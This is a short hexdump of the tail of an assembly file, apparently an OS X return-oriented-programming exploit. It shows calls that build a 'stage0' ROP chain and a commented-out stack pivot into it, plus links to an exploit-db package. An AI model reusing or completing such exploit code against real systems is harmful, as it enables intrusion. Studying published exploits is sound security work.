000011f0  20 20 63 61 6c 6c 20 20  20 20 6d 61 6b 65 5f 73  |  call    make_s|
00001200  74 61 67 65 30 0d 0a 20  0d 0a 20 20 20 20 63 61  |tage0.. ..    ca|
00001210  6c 6c 20 20 20 20 70 72  69 6e 74 5f 69 74 0d 0a  |ll    print_it..|
00001220  20 0d 0a 20 20 20 20 3b  6c 65 61 20 20 20 20 20  | ..    ;lea     |
00001230  72 73 70 2c 20 5b 72 65  6c 20 72 6f 70 5f 73 74  |rsp, [rel rop_st|
00001240  61 67 65 30 5d 0d 0a 20  20 20 20 3b 72 65 74 0d  |age0]..    ;ret.|
00001250  0a 20 0d 0a 20 20 20 20  6c 65 61 76 65 0d 0a 20  |. ..    leave.. |
00001260  20 20 20 72 65 74 0d 0a  20 0d 0a 3b 20 73 65 65  |   ret.. ..; see|
00001270  20 68 74 74 70 3a 2f 2f  74 2e 63 6f 2f 6e 49 72  | http://t.co/nIr|
00001280  52 62 6e 35 20 66 6f 72  20 61 20 64 65 74 61 69  |Rbn5 for a detai|
00001290  6c 65 64 20 65 78 70 6c  61 6e 61 74 69 6f 6e 0d  |led explanation.|
000012a0  0a 3b 20 66 75 6c 6c 20  70 61 63 6b 61 67 65 20  |.; full package |
000012b0  6d 69 72 72 6f 72 3a 20  68 74 74 70 3a 2f 2f 77  |mirror: http://w|
000012c0  77 77 2e 65 78 70 6c 6f  69 74 2d 64 62 2e 63 6f  |ww.exploit-db.co|
000012d0  6d 2f 73 70 6c 6f 69 74  73 2f 6f 73 78 2e 72 6f  |m/sploits/osx.ro|
000012e0  70 2e 32 34 30 37 32 30  31 31 2e 74 67 7a        |p.24072011.tgz|
000012ee
